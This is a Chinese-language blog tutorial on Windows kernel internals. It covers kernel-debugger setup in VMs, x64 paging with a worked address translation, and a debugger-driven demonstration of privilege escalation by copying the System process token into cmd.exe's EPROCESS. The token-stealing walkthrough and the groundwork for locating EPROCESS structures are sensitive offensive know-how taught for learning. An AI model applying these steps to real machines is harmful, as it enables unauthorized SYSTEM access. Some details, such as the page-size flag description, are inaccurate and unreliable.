# Windows Kernel Driver - 初步理解和提權探討ˋ


## I. Kernel Driver 是甚麼
「Kernel Driver」，即**核心模式驅動程式**，指的是與作業系統核心（Kernel）緊密結合並負責控制硬體設備或提供低層次操作的軟體元件。作業系統核心是作業系統中最基本且最關鍵的部分，它負責管理硬體資源、處理程序、記憶體管理等。Kernel Driver 主要**作為硬體和作業系統之間的橋樑**。



這些驅動程式通常是特定硬體的控制程序，例如顯示卡、網路卡、磁碟驅動器等，它們負責處理與硬體設備的通訊、資料傳輸及指令解釋等工作。Kernel Driver 是在核心層級運行，因此擁有比一般應用程式更高的權限。

以下是 Windows 作業系統中一些常見的 Kernel Drivers:
|名稱       |功能       |
|-----------|-----------|
|dxgkrnl.sys|管理 DirectX 應用程式與顯示卡 (GPU) 之間的互動，處理 3D 圖形渲染及硬體加速，特別是在 DirectX 11 和 12 中。
|wdmaud.sys|管理操作系統與音效硬體的通訊，處理音訊播放、輸入及錄音功能。|
|tcpip.sys | 實現 TCP/IP 協議棧(Stack)，管理網路通信，處理封包及路由等。|
|disk.sys|管理硬碟、SSD 等儲存裝置的低層次存取，協助資料的讀取與寫入。|

而 Microsoft 也有提供關於 Kernel Driver 的驅動程式套件 [WDK](https://learn.microsoft.com/zh-tw/windows-hardware/drivers/download-the-wdk)

* ## 準備 Kernel Debugger

核心偵錯和一般偵錯不太一樣，所以這裡抽一篇幅來講如何使用虛擬機配置核心偵錯環境。

這裡講量種不同的虛擬機配置，HyperV 和 VMware。

<details>
  <summary style="font-size: 20px; font-weight: bold;">Hyper-V</summary>
    首先，加設好一台 Windows VM，並以管理員身分執行 CMD。

* #### 啟用偵錯模式 
    輸入 ```bcdedit```
    
    ![ref8](https://lompandi.github.io/posts/post3/imgs/checkset.png)
    
    你應該會看到 ```debug           No```，這代表偵錯模式已關閉，我們要打開它。很簡單，輸入:
    
    ```bcdedit /debug on``` 即可。 
    
    如果不行的話，去看一下 VM 的安全開機 (Secure Boot) 選項是否開啟，如果是，關掉它。

    選擇虛擬機器。右鍵點擊虛擬機，然後點擊設定。

    在左側窗格中，按一下「安全性」標籤。
    
    然後在「安全啟動」下，取消選取「啟用安全啟動」。

    ![ref9](https://lompandi.github.io/posts/post3/imgs/secure_boot_disable.png)
    
* #### 設定遠端偵錯選項
    首先，開啟```虛擬交換器管理員 -> 建立虛擬交換器(S)```，將連線類型改為```外部網路(E)```，取個名稱並在下方清單中選取你實體機的網路卡，然後按下```確定(O)```
    
    ![ref10](https://lompandi.github.io/posts/post3/imgs/1.png)
    ![ref11](https://lompandi.github.io/posts/post3/imgs/2.png)
    ![ref12](https://lompandi.github.io/posts/post3/imgs/3.png)

    接下來重新啟動，並開啟 CMD，輸入```ipconfig``` 以得到 Local IP，確認他的 IP 遮罩是否跟你實體機的一樣。

    在以管理員身分執行的 CMD輸入 ```bcdedit /dbgsettings NET HOSTIP:<電腦的本地IP(LAN)>  PORT:<連線的通訊埠號> KEY:p.a.s.s```
    
    ```KEY```  要設甚麼都可以，開心就好。

    完成後用 ```bcdedit /dbgsettings``` 查看設定好的配置，會長的像下面這樣(IP, POST, KEY 會因設定而異)
    
    ![ref9](https://lompandi.github.io/posts/post3/imgs/checksettings.png)
</details>

<details>
  <summary style="font-size: 20px; font-weight: bold;">VMware (Workstation)</summary>
    首先，加設好一台 Windows VM，並以管理員身分執行 CMD。

* #### 啟用偵錯模式 
    輸入 ```bcdedit```
    
    ![ref8](https://lompandi.github.io/posts/post3/imgs/checkset.png)
    
    你應該會看到 ```debug           No```，這代表偵錯模式已關閉，我們要打開它。很簡單，輸入:
    
    ```bcdedit /debug on``` 即可。
    
    如果不行的話，去看一下 VM 的安全開機 (Secure Boot) 選項是否開啟，如果是，關掉它。
    ![ref9](https://lompandi.github.io/posts/post3/imgs/disable-secure.png)
    
* #### 設定遠端偵錯選項
    首先，開啟```VM -> Settings -> Network Adapter```，將網路連線改為 **Bridged**(橋接介面卡)
    
    ![ref10](https://lompandi.github.io/posts/post3/imgs/bridge.png)

    接下來重新啟動，並開啟 CMD，輸入```ipconfig``` 以得到 Local IP，確認他的 IP 遮罩是否跟你實體機的一樣。

    在以管理員身分執行的 CMD輸入 ```bcdedit /dbgsettings NET HOSTIP:<電腦的本地IP(LAN)>  PORT:<連線的通訊埠號> KEY:p.a.s.s```
    ```KEY``` 要設甚麼都可以，開心就好。

    完成後用 ```bcdedit /dbgsettings``` 查看設定好的配置，會長的像下面這樣(IP, POST, KEY 會因設定而異)
    
    ![ref9](https://lompandi.github.io/posts/post3/imgs/checksettings.png)
    
    接下來去 Windows VM 中的設定關掉防火牆，然後就設定完成了。
    
</details>
    
* #### 開始用 kd 遠端偵錯
 
    因為我個人偏好在 CMD 中使用 kd ， 所以我會將 kd 的 路徑 ```C:\Program Files (x86)\Windows Kits\10\Debuggers\x64 ``` 加到環境變數 ```PATH``` 中。

    之後，就可以在 使用這個指令 
    
    ```kd -k net:port=<連線的通訊埠號>,key=<設定的KEY值>```
    
    來嘗試連接了。
    
    有時候它可能偵測不到，就再加一個參數 target 指定目標 IP
    
    ```kd -k net:port=<連線的通訊埠號>,key=<設定的KEY值>,target=<被偵錯機器的IP>```
    
    ![ref10](https://lompandi.github.io/posts/post3/imgs/connected.png)
    
    如果你看到 ```Connected to target ... ```，那就代表你連接上了，這個時候像 windbg 一樣按 Ctrl-C 或 break 可以中斷 VM 執行。
    
* ## kd 基本指令介紹:
    以下指令所涉及的資料型別大小均以 64 位元架構為基準。 


    |指令|功能|
    |---|-----|
    |dx 虛擬位址| 傾印**虛擬位址**中記憶體內容。 x 為單位大小和格式，可為 ```c、 b、 w、 d、 q、 p```，分別代表 char (1個位元組，並提供位元 ASCII 碼轉換資料)、byte (1個位元組)，word (2個位元組)、doubleword (4個位元組)、quadword (8個位元組)，和 pointer (8 位元組)。e.g. ```dq fffff807`1d800000```
    |!dx 實體位址| 傾印**實體位址**中記憶體內容。和 ```dx``` 用法一樣。e.g. ```!dq fffff807`1d800000```
    |bp 位址| 於位址上設置一個中斷點，位址格式可使用完全位址 e.g. ```bp fffff807`1d800000```，也可使用 mod + offset 定址 e.g. ```bp cmd.exe+0x1234```。
    |r 暫存器|顯示暫存器內的值 e.g. ```r rax```，若不指定，將列出一些常見的暫存器內的值。|
    |ex 虛擬位址 值|寫入單位大小和格式為x的值到虛擬位址中，x 的種類和 ```dx``` 一樣。|

## II.1 控制暫存器
如果平時有在碰逆向工程相關方面的話，對於 Rax, Rcx, Rbx, Rdx, Rsi, Rsp, Rdi, Rbp, R8 ~ R15

這些暫存器應該不陌生，那其實還有另一類暫存器，專門改變或控制CPU行為，稱為[控制暫存器](https://en.wikipedia.org/wiki/Control_register)，在 64 位元系統上存在 Cr0 ~ Cr4 和 Cr8 這六種控制暫存，其暫存內容儲存了可以控制CPU行為的資料，以64位元模式 (64-bit mode, long mode) 來說，結構如下:

![ref1](https://lompandi.github.io/posts/post3/imgs/062111_1434_x86x8664CPU1.png)

其中灰色區域為保留欄位。

### 重要欄位說明:
### Cr0: 

|位元|欄位名稱|意義|
|----|-|----|
|31  | PG |控制分頁機制 (Paging) 是否生效，若為 1，分頁機制生效，把線性位址轉換為物理位址；若為 0， 分頁機制無效，線性位址直接作為物理位址|
|0   | PE| 若為 0，則CPU處於真實模式 (Real Mode)，此時 使用分段機制，此時若將PG設置為 1 將引起一般保護錯誤 (GPF)|

### Cr2:
|位元|欄位名稱|意義|
|----|--------|----|
|63~0| -      |  存放[分頁錯誤](https://zh.wikipedia.org/zh-tw/%E9%A1%B5%E7%BC%BA%E5%A4%B1)的虛擬位址|

### Cr3 (PDBR):
|位元|欄位名稱|意義|
|----|--------|----|
|51 ~ 12|-    | 指定**4級分頁表**的**基底位址**|

### Cr4:
![cr4](https://lompandi.github.io/posts/post3/imgs/CR4.jpg)
|位元|欄位名稱|意義|
|----|--------|----|
|21  | SMAP   | 指定SMAP是否生效|
|20  | SMEP   | 指定SMEP是否生效|
|5   | PAE    | 指定[實體位址擴充](https://zh.wikipedia.org/zh-tw/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%E6%89%A9%E5%B1%95)是否生效|

## II.2 記憶體布局和虛擬位址
在 Windows 系統中，核心模式和使用者模式的記憶體分區大致上如下:

|分區| x86 32 位元 Windows | x64 64 位元 Windows|
|------------|--------------|--------------------
|空指標指定值分區|0x00000000 ~ 0x0000FFFF，大小為 64KB | 0x00000000\`00000000 ~ 0x00000000\`0000FFFF，大小為 64KB
|**使用者模式分區**|0x00010000 ~ 0x7FFEFFFF，大小為約 2GB|0x00000000\`00010000 ~ 0x00007FFF\`FFFEFFFF，大小為約 128TB|
|禁入分區|0x7FFF0000 ~ 0x7FFFFFFF，大小為 64KB| 0x00007FFF\`FFFFF0000 ~ 0x00007FFF\`FFFFFFFFF， 大小為 64KB|
|**核心模式分區**| 0x80000000 ~ 0xFFFFFFFF，大小為約 2GB|0x00008000\`00000000 ~ 0xFFFFFFFF\`FFFFFFFF，大小為約 16EB

(表中 64 位元 Windows 記憶體分區以 Windows 10 為例)

1. #### 空指標指定值分區: 

空 (NULL) 指標指定值分區是處理虛擬位址空間中 0x0000000 ~ 0x0000FFFF
   
的閉區間，如果處理程序試圖讀去或寫入位於這一分區的記憶體位址，就會引發**存取違規** (Access Violation)。

2. #### 使用者模式 (User Mode) 分區

使用者模式分區是每個處理程序可以使用的虛擬位址空間。程式中用到的動態連結程式庫 (dll)

也會載入這一分區，但是**程式執行時還要透過記憶體管理單元 (MMU) 將虛擬位址映射為實體記憶體位址 (Physical Address)**，

處理程序可用的虛擬位址空間總量受物理儲存空間 (即實體記憶體) 含虛擬記憶體大小之和的限制。

雖然 64 位元程式理論上可以使用 128TB 的虛擬空間，但實際上作業系統目前並不支援這麼大的虛擬位址空間，一方面不需要，

另一方面管理和維護這麼大的位址空間需要較大的消耗。

3. #### 禁入分區

由 Windows 保留的一快虛擬記憶體位址區域。

4. #### 核心模式 (Kernel Mode) 分區

核心模式分區式作業系統程式的駐地，與執行緒排序、記憶體管理、檔案系統、網路支援以及**驅動裝置程式**相關的程式都

載入該分區。該分區中的所有程式和資料都被保護起來，如果一個應用程式 (位於使用者模式分區)

試圖讀去或寫入位於這一分區的記憶體位址，就會引發**存取違規**，導致系統強制結束該程式。

* ## 虛擬位址(線性位址)

### 歷史
在**保護模式**引入之前（即 80286 處理器之前），**真實模式（Real Mode）** 是 x86 架構的唯一工作模式，而 真實模式並沒有虛擬位址和特權等級的概念，程式可以任意修改實體記憶體位址處的內容，包括系統程式。這帶給作業系統極大的安全問題。

Intel 在 1982 年推出的 80286 處理器中引入**保護模式（Protected Mode）**，首次引入是虛擬位址，並在後續的 80386 處理器中進一步完善。

### 原理
虛擬位址是通過硬體和作業系統將實體位址轉換而成的連續位址空間。在現代作業系統中，虛擬位址讓**每個程式都能擁有獨立的記憶體空間**，從而避免不同程式之間的記憶體衝突。這些虛擬位址最終會被轉換為實體位址。

使用四級分頁表的虛擬記憶體的組成如下:

![ref3](https://lompandi.github.io/posts/post3/imgs/Addressing.png)

```c++
union VIRTUAL_ADDRESS {
    struct {
        uint64_t Offset : 12;
        uint64_t PtIndex : 9;
        uint64_t PdIndex : 9;
        uint64_t PdPtIndex : 9;
        uint64_t Pml4Index : 9;
        uint64_t Reserved : 16;
    } u;
};
```

其中除保留欄位外，剩下的欄位都是用來轉換其到實體位址的，下面慢慢說。

* ## 分頁表:

### 說明:

|名詞 |意思|
|-----|----|
|PML4 |**P**age **M**ap **L**evel **4**，四級分頁映射表|
|PDPT| **P**age **D**irectory **P**ointer **T**able，分頁目錄指標表|
|PD  | **P**age **D**irectory，分頁目錄表|
|PT  | **P**age **T**able，分頁表|

### 分頁表入口 (Page Table Entry, PTE)
尾端的 "E"(如PML4**E**、PT**E**) 代表 "Entry"，即分頁表的入口，每個入口大小為8個位元。

 PML4 表包含了 512 個 PML4E，所以這代表4級分頁表可以容納 512GB 的實體位址。

Windows 在 ```MMPTE_HARDWARE```  中定義了分頁表入口的結構:
```c++
union MMPTE_HARDWARE {
    struct {
        uint64_t Present : 1;               //P
        uint64_t Write : 1;                 //R/W
        uint64_t UserAccessible : 1;        //U/S
        uint64_t WriteThrough : 1;          //PWT
        uint64_t CacheDisable : 1;          //PCD
        uint64_t Accessed : 1;              //A
        uint64_t Dirty : 1;                 //D
        uint64_t LargePage : 1;             //PS
        uint64_t Available : 4;             //G
        uint64_t PageFrameNumber : 36;
        uint64_t ReservedForHardware : 4;   
        uint64_t ReservedForSoftware : 11;
        uint64_t NoExecute : 1;             //XD
    } u;
};
```

(P.S. **其實PML4、PDPT、PD、PT的入口都是這種結構**，只是名稱容易混淆)

分頁表入口結構包含硬體控制位元，可以控制分頁的屬性。

一些常用的硬體控制位元如下:
#### 1. 存在（P）:

決定線性位址在實體記憶體中的位置。如果沒有實體位址，則會發生分頁錯誤，且 MMU 將嘗試將位址映射到 RAM 中。
#### 2. 讀/寫（R/W）:

決定該分頁是否可以寫入。如果清除此位，則該分頁為唯讀。 CR0 暫存器的第 16 位元（寫入保護）決定此控制標誌是否套用於核心模式分頁，否則將套用於使用者模式分頁。
#### 3. 使用者/管理員（U/S）

表示對應分頁是否僅為核心模式或使用者模式。如該位元為1，則該分頁可由兩者輕鬆訪問，否則它將僅限於核心模式。如果為某個 PDE 設定了該位元，那麼該 PDE 下的所有分頁都將繼承該控制標誌，除非 PTE 覆寫該標誌。
#### 4. 分頁直寫 ( PWT ):

控制分頁的快取模式以及使用[直寫](https://en.wikipedia.org/wiki/Cache_\(computing\)#WRITE-THROUGH)或回寫快取。如果設定了此位，則使用直寫快取。

#### 5. 分頁快取停用 ( PCD ) : 

顧名思義， 用於啟用或停用分頁快取。

#### 6. [髒（D）位元](https://en.wikipedia.org/wiki/Dirty_bit):

指示該分頁已被寫入；通常髒分頁必須先重設後才能被另一個程序使用。

#### 7. **分頁大小 ( PS )**:

若為1，其所對應的分頁為**大分頁 (Large Page, 4MB)**，反之則為**超大分頁 (Huge Page, 1GB)**。

#### 8. 全域（G）:

用於決定當 CR3 清除或變更時 TLB 快取刷新 的位置。只有當 CR4 暫存器中的分頁全域啟用 (PGE) 位元為 1 時，此控制位元才適用。其允許多個位址空間共享相同的分頁。

#### 9. 執行停用（XD，又稱NX）:

僅在處理器以**長模式**運作時適用，但它決定了指令可以在指定分頁內的任何位置執行。僅當 EFER 暫存器中的 NXE 位元為 1 時時才支援此功能。

## II.3 虛擬位址到實體位址的轉換

![ref2](https://lompandi.github.io/posts/post3/imgs/x64-paging.png)

控制暫存器 CR3 負責指定4級分頁表(PLM4)。

* ### 步驟一
將 CR3 轉換為```MMPTE_HARDWARE```，將其 ```PageFrameNumber```  乘以**4096**，得到**PML4 的基底實體位址**。

再將要轉換的虛擬位址中的 PML4 Index 乘以 8，加上 PML4 的基底實體位址，得到 **PML4E 的實體位址**。

* ### 步驟二
從 PLM4E 的實體位址讀入 8 個位元組並轉換為```MMPTE_HARDWARE```，將其 ```PageFrameNumber``` 乘以 4096，得到 **PDPT 的基底實體位址**。

將要轉換的虛擬位址中的 PDPT Index 乘以 8，加上 PDPT 的基底實體位址，得到 **PDPTE 的實體位址**。

* ### 步驟三
從 PDPTE 的實體位址讀入 8 個位元組並轉換為```MMPTE_HARDWARE```，將其 ```PageFrameNumber``` 乘以 4096，得到 **PD 的基底實體位址**。

* ### 步驟四(1) (PDPTE 的 PS 旗標為 1)，完成計算
這時如果 PDPTE 的 PS 旗標（位元 7）為 1，無須分頁表。直接將 PD 的基底實體位址與虛擬位址中前 30 個 位元相加，**即可直接對應所求的實體記憶體位址**。

* ### 步驟四(2) (PDPTE 的 PS 旗標為 0)
如果 PDPTE 的 PS 旗標為 0 ，那麼就像前兩次所做的那樣，將虛擬位址中的 PD Index 乘以 8 個然後加上 **PD 基底實體位址**，得到 **PDE 的實體位址**。

* ### 步驟五
從 PDE 的實體位址讀入 8 個位元組並轉換為```MMPTE_HARDWARE```，將其 ```PageFrameNumber``` 乘以 4096 得到**PT 的基底實體位址**。

* ### 步驟六(1) (PDE 的 PS 旗標為 1)，完成計算
如果 PDE 的 PS 旗標為 1，直接將虛擬位址中前 28 個位元和 **PT 基底實體位址** 相加，**即可直接對應所求的實體記憶體位址**。

* ### 步驟六(2) (PDE 的 PS 旗標為 0)
反之，如果 PDE 的 PS 旗標為 0，則將虛擬位址中的 PT Index 乘以 8 個然後加上 **PT 基底實體位址**，得到  **PTE 的實體位址**。之後，

* ### 步驟七，完成計算
從 PTE 的實體位址讀入 8 個位元組並轉換為```MMPTE_HARDWARE```，將其 ```PageFrameNumber``` 乘以 4096 加上虛擬位址的 Offset，**即可得到所求的實體記憶體位址**。

有分支計算的部份可能有些眼花撩亂，幫大家整理一下:

#### 1. *if* PDPTE.PS is *1* -> *Physical Address* = *PD Base* + *Virtual Address*[0:29]
#### 2. *if* PDE.PS is *1* ->   *Physical Address* = *PT Vase* + *Virtual Address*[0:27]

幸運的是，我們不必手動計算每個分頁結構表，因為 kd 中的!pte指令可以直接幫我們計算。

```
kd> !pte fffff802`7c000000
                                           VA fffff8027c000000
PXE at FFFFBE5F2F97CF80    PPE at FFFFBE5F2F9F0048    PDE at FFFFBE5F3E009F00    PTE at FFFFBE7C013E0000
contains 0000000003F09063  contains 0000000003F0A063  contains 8A000000020001A1  contains 0000000000000000
pfn 3f09      ---DA--KWEV  pfn 3f0a      ---DA--KWEV  pfn 2000      -GL-A--KR-V  LARGE PAGE pfn 2000
```

其中每條虛線對應一個特定的控制位元。PXE 部分實際上是指該線性位址的 PML4 表，而 PPE 則表示分頁 PDP 表。(為甚麼要亂給人家改名字??😭)

那接下來我們就使用上述方式來手算 ```fffff802`7c000000``` 的 Physical Address。

手先，輸入 ```r cr3``` 取得cr3的值:
```
kd> r cr3
cr3=00000000001ad000
```
先將 Virtual Address 轉換，得到分頁表的索引值和偏移值:
```
Offset: 0
PtIndex: 0
PdIndex: 1e0
PdPtIndex: 9
Pml4Index: 1f0
```

取其 12~48 個位元，即 ```0x0000001ad```，乘以 4096，得到 ```0x00000000001ad000```。加上 ```Pml4Index x 8```，即 ```0x1F0 x 8 = 0xF80```，得 PML4E 的位址在 ```0x00000000`001adf80```。

接下來，使用```!dq 0x00000000`001adf80 L1``` 來取得實體位址 ```0x00000000`001adf80``` 的指標。(q 代表 quadword，在 64 位元架構上是 8 個 byte)

```
kd> !dq 0x00000000`001adf80 L1
#  1adf80 00000000`03f09063
```
得到 PML4E ```0x00000000`03f09063```。 和 !pte 的 PXE 對應一下，發現我們計算正確。

接下來，取```0x00000000`03f09063```的 12~48 個位元，乘以 4096，得 ```0x00000000`03f09000```。加上 0x48 (即 PdPtIndex x 8)，得到 PDPTE 的位址在 ```0x00000000`03f09048```:
```
kd> !dq 0x00000000`03f09048 L1
# 3f09048 00000000`03f0a063
```
得到 PDPTE ```00000000`03f0a063```。 和 !pte 的 PPE 對應一下，發現我們計算正確。

接下來，先將 PDPTE 轉換成```MMPTE_HARDWARE```:
```
Present: 1
Write: 1
UserAccessible: 0
WriteThrough: 0
CacheDisable: 0
Accessed: 1
Dirty: 1
LargePage: 0
Available: 0
PageFrameNumber: 3f0a
NoExecute: 0
```
發現其 LargePage 設為 0，故繼續計算，
取```00000000`03f0a063```的 12~48 個位元，乘以 4096，得 ```0x00000000`03f0a000```。加上 0xF00 (即 PdIndex x 8)，得到 PDE 的位址在 ```0x00000000`03f0af00```:

```
kd> !dq 0x00000000`03f0af00 L1
# 3f0af00 8a000000`020001a1
```
得到 PDE ```8a000000`020001a1```，將其轉換成```MMPTE_HARDWARE```:
```
Present: 1
Write: 0
UserAccessible: 0
WriteThrough: 0
CacheDisable: 0
Accessed: 1
Dirty: 0
LargePage: 1
Available: 1
PageFrameNumber: 2000
NoExecute: 1
```
發現其 LargePage 設為 1，故取```0x8a000000`020001a1```的 12~48 個位元，乘以 4096，得 ```0x02000000```。

並將其加上 Virtual Address 的 1 ~ 28 位元，得轉換後的實體位址 = 0x02000000 + 0 = **0x02000000**。

接著使用```dq```和```!dq```來比較 Virtual Address 和 Physical Address 的資訊，並檢查計算結果:
```
kd> dq fffff802`7c000000
fffff802`7c000000  00000003`00905a4d 0000ffff`00000004
fffff802`7c000010  00000000`000000b8 00000000`00000040
fffff802`7c000020  00000000`00000000 00000000`00000000
fffff802`7c000030  00000000`00000000 00000118`00000000
fffff802`7c000040  cd09b400`0eba1f0e 685421cd`4c01b821
fffff802`7c000050  72676f72`70207369 6f6e6e61`63206d61
fffff802`7c000060  6e757220`65622074 20534f44`206e6920
fffff802`7c000070  0a0d0d2e`65646f6d 00000000`00000024
kd> !dq 0x02000000
# 2000000 00000003`00905a4d 0000ffff`00000004
# 2000010 00000000`000000b8 00000000`00000040
# 2000020 00000000`00000000 00000000`00000000
# 2000030 00000000`00000000 00000118`00000000
# 2000040 cd09b400`0eba1f0e 685421cd`4c01b821
# 2000050 72676f72`70207369 6f6e6e61`63206d61
# 2000060 6e757220`65622074 20534f44`206e6920
# 2000070 0a0d0d2e`65646f6d 00000000`00000024
```

可以發現，兩者包含的資訊相同，故我們的轉換計算正確 <span style="font-size: 24px;">😆</span> 。

## III. 特權提升 (Priveledge Esclation) 
那之前說到了，Kernel Driver 有比一般應用程式更高的權限，那 Windows 作業系統是如何辨別每個程序的權限呢 ?

這就和**存取權杖** (Access Token) 有關了。

* ### Access Token

存取權杖 (Access Token) 簡單來說就是一個用來描述程序或執行緒的資料，當使用者登入時，系統會產生存取權杖，

並以此識別程序或執行緒的使用者**以及其權限**。如果要更詳細的資訊，可以參考由 Microsoft 提供的[參考文件](https://learn.microsoft.com/zh-tw/windows/win32/secauthz/access-tokens)。

實際上，Access Token 是有可能被篡改的，這意味著你可以將一個具有更高權限(如，系統權限)的 Access Token 嵌入到你的程序中，從而使你的程式獲得與該高權限程序相同的權限。這就是 Windows 中**特權提升**(或提權)的常用做法。

我們可以用 kd 來**模擬**提權的過程，首先，在虛擬機器中開啟一個 CMD，接下來在CMD中輸入 ```whoami```:
```
C:\Users\seantzou>whoami
desktop-xxxxxxx\seantzou
```

你會看到的使用者的名稱，這代表當前CMD是以使用者的權限執行的。

接下來在 kd 中輸入 ```!process 0 1 cmd.exe```:
```
kd> !process 0 1 cmd.exe
PROCESS ffffe60fced33080
    SessionId: 1  Cid: 14a0    Peb: 2d9e8d7000  ParentCid: 1140
    DirBase: 1f64fb000  ObjectTable: ffffbe8c99224d00  HandleCount:  73.
    Image: cmd.exe
    VadRoot ffffe60fd27d2dd0 Vads 36 Clone 0 Private 239. Modified 0. Locked 8.
    DeviceMap ffffbe8c493ba900
    Token                             ffffbe8ca37e5670
    ElapsedTime                       00:03:07.148
    UserTime                          00:00:00.000
    KernelTime                        00:00:00.000
    [...]
```

我們可以看到有一個 ```Token``` 欄位，那就是 cmd.exe 的 Access Token。接下來，我們需要找一個有系統權限的程序並拷貝他的 Token, 但是要找哪個程序呢? 其實，在 Windows 中，有一個system 程序，PID 恆為 4 ，他就有系統權限的 Token，我們來看一下:
```
kd> !process 4 1
Searching for Process with Cid == 4
PROCESS ffffe60fc927b040
    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
    DirBase: 001ad000  ObjectTable: ffffbe8c44c5dec0  HandleCount: 2819.
    Image: System
    VadRoot ffffe60fc92a5790 Vads 6 Clone 0 Private 22. Modified 155603. Locked 0.
    DeviceMap ffffbe8c44c39300
    Token                             ffffbe8c44c4c080
    ElapsedTime                       01:47:28.365
    UserTime                          00:00:00.000
    KernelTime                        00:00:14.515
    [...]
```
這樣，擁有系統權限的 Token 就到手了!那麼，我們如何把 cmd.exe 的 Token 竄改成 system 的呢?

我們之前輸入 ```!process <...>``` 時，會出現一個 ```PROCESS <...>```，它指向一個叫 EPROCESS 的結構。每個程序都有自己的 EPROCESS 結構，裡面儲存了 Access Token。

可以在 kd 中輸入 ```dt nt!_EPROCESS``` 來查看 ```EPROCESS``` 的整體結構。
```
kd> dt nt!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x438 ProcessLock      : _EX_PUSH_LOCK
   +0x440 UniqueProcessId  : PVOID
   +0x448 ActiveProcessLinks : _LIST_ENTRY
   [...]
   +0x4b8 Token            : _EX_FAST_REF
   [...]
```
其中，Access Token 被儲存在基底偏移 0x4b8 的位址，為一個 ```_EX_FAST_REF``` 結構。

以 system 程序為例，我們只需將 ```PROCESS <...>``` 的值加上 0x4b8，並使用 ```dt _EX_FAST_REF <位址>``` 來查看其資料:
```
kd> dt _EX_FAST_REF ffffe60fc927b040+4b8
nt!_EX_FAST_REF
   +0x000 Object           : 0xffffbe8c`44c4c08c Void
   +0x000 RefCnt           : 0y1100
   +0x000 Value            : 0xffffbe8c`44c4c08c
```
你會發現 ```Value```欄位的值跟之前看到的 Token 不太一樣，那是因為 ```_EX_FAST_REF``` 會將其參考數量(Reference Count) 處存於 Value 的前四位元，所以將其 mask 掉以後，就可以得到真正的 Token 值了。
```
>>> print(hex(0xffffbe8c44c4c08c & ~0b1111))
0xffffbe8c44c4c080
```

最後，我們只需把這個值寫到 cmd.exe 的 Token 值就大功告成了! 這裡使用 ```eq <address> <value>``` 來改變 cmd.exe 的 EPROCESS.Token 欄位的值，然後讓 VM 繼續跑:
```
kd> eq ffffe60fced33080+4b8 ffffbe8c44c4c080
kd> g
```
完成以後，再次在 CMD 中輸入 ```whoami```:
```
C:\Users\seantzou>whoami
nt authority/system
```

可以看到，我們有 system 權限了，提權成功! 🎉🎉🎉

但是，剛剛的 EPROCESS 指標是 kd "送"給我們的，那我們要如何自己找到 cmd.exe 和 system 的 EPROCESS 指標呢?

這裡就來介紹另外兩個結構，**KPCR**、**KPCRB** 和 **KTHREAD**。

* ### KPCR (Kernel Processor Control Region)

    KPCR 是對應到 CPU 的一個結構，就和剛剛講的 EPROCESS 跟程序的關係差不多，結構如下:
    ```c++
    typedef struct _KPCR {
        _NT_TIB NtTib;                                      // +0x000
        _KGDTENTRY64*       GdtBase;                        // +0x000
        _KTSS64*            TssBase;                        // +0x008
        ULONG64             UserRsp;                        // +0x010
        _KPCR*              Self;                           // +0x018
        _KPRCB*             CurrentPrcb;                    // +0x020
        _KSPIN_LOCK_QUEUE*  LockArray;                      // +0x028
        PVOID               Used_Self;                      // +0x030
        _KIDTENTRY64*       IdtBase;                        // +0x038
        ULONG64             Unused[2];                      // +0x040
        UCHAR               Irql;                           // +0x050
        UCHAR               SecondLevelCacheAssociativity;  // +0x051
        UCHAR               ObsoleteNumber;                 // +0x052
        UCHAR               Fill0;                          // +0x053
        ULONG               Unused0[3];                     // +0x054
        USHORT              MajorVersion;                   // +0x060
        USHORT              MinorVersion;                   // +0x062
        ULONG               StallScaleFactor;               // +0x064
        PVOID               Unused1[3];                     // +0x068
        ULONG               KernelReserved[15];             // +0x080
        ULONG               SecondLevelCacheSize;           // +0x0bc
        ULONG               HalReserved[16];                // +0x0c0
        ULONG               Unused2;                        // +0x100
        PVOID               KdVersionBlock;                 // +0x108
        PVOID               Unused3;                        // +0x110
        ULONG               PcrAlign1[24];                  // +0x118
        _KPRCB              Prcb;                           // +0x180
    } KPCR;
    ```
    在64位元系統中，分段暫存器 gs:[0] 即儲存了這個結構，所以我們可以使用 gs:[...] 來讀取 KPCR 結構的欄位。
    而 KPCR 中有一個拓展欄位 ```Prcb``` (偏移量 0x180)， 其結構即為 ```KPRCB```。
    
* ### KPRCB (Kernel Processor Control Block):

    KPRCB 其也儲存有關 CPU 和執行緒的資料。KPRCB 的**部份**結構如下: 
    ```c++
    typedef struct _KPRCB {
        ULONG           MxCsr                      // +0x000 
        UCHAR           LegacyNumber               // +0x004 
        UCHAR           ReservedMustBeZero         // +0x005 
        UCHAR           InterruptRequest           // +0x006 
        UCHAR           IdleHalt                   // +0x007 
        _KTHREAD*       CurrentThread              // +0x008 
        _KTHREAD*       NextThread                 // +0x010 
        _KTHREAD*       IdleThread                 // +0x018 
        UCHAR           NestingLevel               // +0x020 
        UCHAR           ClockOwner                 // +0x021 
        UCHAR           PendingTickFlags           // +0x022 
        
        //[...] 省略
    } KPRCB;
    ```
    
    注意他的 ```CurrentThread```欄位 (偏移量 0x8)，他會指向目前程序執行緒的 ```ETHREAD``` 結構。
    
* ### KTHREAD:

    KTHREAD 簡單來說就是 ETHREAD 結構的內核部分，**部份**結構如下:
    ```c++
    typedef struct _KTHREAD {
        _DISPATCHER_HEADER  Header                    // +0x000 
        PVOID          SListFaultAddress;             // +0x018 
        ULONG64        QuantumTarget;                 // +0x020 
        PVOID          InitialStack;                  // +0x028 
  
        //[...] 省略
        UCHAR               SpecCtrl;                 // +0x07f 
        ULONG               SystemCallNumber;         // +0x080 
        ULONG               ReadyTime;                // +0x084 
        PVOID               FirstArgument;            // +0x088 
        Ptr64 _KTRAP_FRAME  TrapFrame;                // +0x090 
        union {
            _KAPC_STATE     ApcState;                 // +0x098 
            UCHAR           ApcStateFill[43];         // +0x098
        }
        CHAR                Priority;                 // +0x0c3 
        ULONG               UserIdealProcessor;       // +0x0c4 
   
        //[...] 省略
   } KTHREAD;
    ```
    
    他有一個 union, 裡面有一個 ```ApcState```欄位，為 KAPC_STATE 結構。
    ```c++
    typedef struct _KAPC_STATE{
        _LIST_ENTRY ApcListHead[2];             // +0x000
        _KPROCESS*  Process;                    // +0x020
        UCHAR       InProgressFlags;            // +0x028
        UCHAR       KernelApcInProgress : 1;    // +0x028
        UCHAR       SpecialApcInProgress : 1;   // +0x028
        UCHAR       KernelApcPending;           // +0x029
        UCHAR       UserApcPendingAll;          // +0x02a
        UCHAR       SpecialUserApcPending : 1;  // +0x02a
        UCHAR       UserApcPending : 1;         // +0x02a
    } KAPC_STATE;
    ```
